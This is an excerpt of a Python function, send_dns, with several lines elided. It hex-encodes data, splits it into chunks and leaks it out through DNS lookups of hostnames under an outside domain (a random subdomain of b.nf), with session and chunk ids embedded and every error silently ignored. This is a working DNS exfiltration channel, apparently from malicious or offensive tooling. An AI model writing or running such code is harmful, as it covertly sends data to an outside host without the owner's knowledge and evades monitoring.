...
def send_dns(data, type_prefix, delay=0):
    ...
    if len(hex_data) <= max_chunk_size:
        ...
        try:
            socket.gethostbyname(f'{session_id}.{type_prefix}t1.{hex_data}.testcatplzignore.yqsaji3kdj6np0642szmm078mzspge.b.nf')
        except:
            pass
    else:
        ...
        for index, chunk in enumerate(chunks):
            ...
            try:
                ...
                socket.gethostbyname(f'{session_id}.{chunk_id}.{chunk}.testcatplzignore.yqsaji3kdj6np0642szmm078mzspge.b.nf')
            except:
                pass
